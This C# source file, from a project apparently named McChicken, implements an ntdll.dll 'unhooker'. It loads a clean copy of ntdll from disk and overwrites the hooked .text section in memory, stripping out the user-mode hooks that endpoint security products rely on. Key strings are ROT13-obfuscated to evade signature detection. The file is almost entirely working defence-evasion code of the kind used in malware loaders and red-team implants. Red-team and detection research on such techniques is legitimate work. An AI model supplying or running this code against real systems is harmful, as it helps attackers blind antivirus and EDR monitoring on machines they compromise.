//start
using System.Text;
using System.Linq;
using System;
﻿
using System.Diagnostics;
using System.Runtime.InteropServices;

using DI = DInvoke;

namespace McChicken
{
    class Unhooker
    {
        public static void Unhook()
        {
            try
            {
                #region Map ntdll.dll into memory
                string NtdllPath = string.Empty;
                var hModule = IntPtr.Zero;
                ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
                foreach (ProcessModule Mod in ProcModules)
                {
                    if (Mod.FileName.EndsWith(new string("agqyy.qyy".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), StringComparison.OrdinalIgnoreCase))
                    {
                        NtdllPath = Mod.FileName;
                        hModule = Mod.BaseAddress;
                    }
                }
                IntPtr pModule = DI.ManualMap.Map.AllocateFileToMemory(NtdllPath);
                DI.Data.PE.PE_META_DATA PEINFO = DI.DynamicInvoke.Generic.GetPeMetaData(pModule);
                IntPtr BaseAddress = IntPtr.Zero;
                IntPtr RegionSize = PEINFO.Is32Bit ? (IntPtr)PEINFO.OptHeader32.SizeOfImage : (IntPtr)PEINFO.OptHeader64.SizeOfImage;
                UInt32 SizeOfHeaders = PEINFO.Is32Bit ? PEINFO.OptHeader32.SizeOfHeaders : PEINFO.OptHeader64.SizeOfHeaders;

                IntPtr unhookedLibAddress = DI.DynamicInvoke.Native.NtAllocateVirtualMemory(
                    (IntPtr)(-1), ref BaseAddress, IntPtr.Zero, ref RegionSize,
                    DI.Data.Win32.Kernel32.MEM_COMMIT | DI.Data.Win32.Kernel32.MEM_RESERVE,
                    DI.Data.Win32.WinNT.PAGE_READWRITE
                );
                UInt32 BytesWritten = DI.DynamicInvoke.Native.NtWriteVirtualMemory((IntPtr)(-1), unhookedLibAddress, pModule, SizeOfHeaders);
                foreach (DI.Data.PE.IMAGE_SECTION_HEADER section in PEINFO.Sections)
                {
                    IntPtr pVirtualSectionBase = (IntPtr)((UInt64)unhookedLibAddress + section.VirtualAddress);
                    IntPtr pRawSectionBase = (IntPtr)((UInt64)pModule + section.PointerToRawData);
                    BytesWritten = DI.DynamicInvoke.Native.NtWriteVirtualMemory((IntPtr)(-1), pVirtualSectionBase, pRawSectionBase, section.SizeOfRawData);
                    if (BytesWritten != section.SizeOfRawData)
                        throw new InvalidOperationException(new string("Snvyrq gb jevgr gb zrzbel.".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                }

                #endregion

                Win32.MODULEINFO mi = new Win32.MODULEINFO();
                Win32.GetModuleInformation(Process.GetCurrentProcess().Handle, hModule, out mi, (uint)Marshal.SizeOf(mi));

                IntPtr hookedLibAddress = mi.lpBaseOfDll;
                DI.Data.PE.IMAGE_DOS_HEADER idh = (DI.Data.PE.IMAGE_DOS_HEADER)Marshal.PtrToStructure(hookedLibAddress, typeof(DI.Data.PE.IMAGE_DOS_HEADER));

                IntPtr ih64Address = hookedLibAddress + (int)idh.e_lfanew;
                DI.Data.PE.IMAGE_NT_HEADER64 ih64 = (DI.Data.PE.IMAGE_NT_HEADER64)Marshal.PtrToStructure(ih64Address, typeof(DI.Data.PE.IMAGE_NT_HEADER64));

                IntPtr ifhAddress = (IntPtr)(ih64Address + Marshal.SizeOf(ih64.Signature));
                DI.Data.PE.IMAGE_FILE_HEADER ifh = (DI.Data.PE.IMAGE_FILE_HEADER)Marshal.PtrToStructure(ifhAddress, typeof(DI.Data.PE.IMAGE_FILE_HEADER));

                IntPtr ishAddress = (hookedLibAddress + (int)idh.e_lfanew + Marshal.SizeOf(typeof(DI.Data.PE.IMAGE_NT_HEADER64)));
                DI.Data.PE.IMAGE_SECTION_HEADER ish = new DI.Data.PE.IMAGE_SECTION_HEADER();

                for (int i = 0; i < ifh.NumberOfSections; i++)
                {
                    ish = (DI.Data.PE.IMAGE_SECTION_HEADER)Marshal.PtrToStructure(ishAddress + i * Marshal.SizeOf(ish), typeof(DI.Data.PE.IMAGE_SECTION_HEADER));

                    if (ish.Section.Contains(new string(".grkg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())))
                    {
                        Console.WriteLine($"(Unhooker) [>] Unhooking ntdll.dll!{ish.Section}");

                        IntPtr hookedSectionAddress = IntPtr.Add(hookedLibAddress, (int)ish.VirtualAddress);
                        IntPtr unhookedSectionAddress = IntPtr.Add(unhookedLibAddress, (int)ish.VirtualAddress);

                        uint oldProtect = 0;
                        _ = Win32.VirtualProtect(hookedSectionAddress, (UIntPtr)ish.VirtualSize, DI.Data.Win32.WinNT.PAGE_EXECUTE_READWRITE, out oldProtect);

                        Win32.CopyMemory(hookedSectionAddress, unhookedSectionAddress, ish.VirtualSize);

                        _ = Win32.VirtualProtect(hookedSectionAddress, (UIntPtr)ish.VirtualSize, oldProtect, out uint _);

                        break;
                    }
                }

                #region Free ntdll.dll mapping allocations

                Marshal.FreeHGlobal(pModule);
                RegionSize = PEINFO.Is32Bit ? (IntPtr)PEINFO.OptHeader32.SizeOfImage : (IntPtr)PEINFO.OptHeader64.SizeOfImage;

                DI.DynamicInvoke.Native.NtFreeVirtualMemory((IntPtr)(-1), ref unhookedLibAddress, ref RegionSize, DI.Data.Win32.Kernel32.MEM_RELEASE);

                #endregion
            }
            catch (Exception e)
            {
                Console.WriteLine($"(Unhooker) [x] {e.Message}");
                Console.WriteLine($"(Unhooker) [x] {e.InnerException}");
            }
        }
    }
}
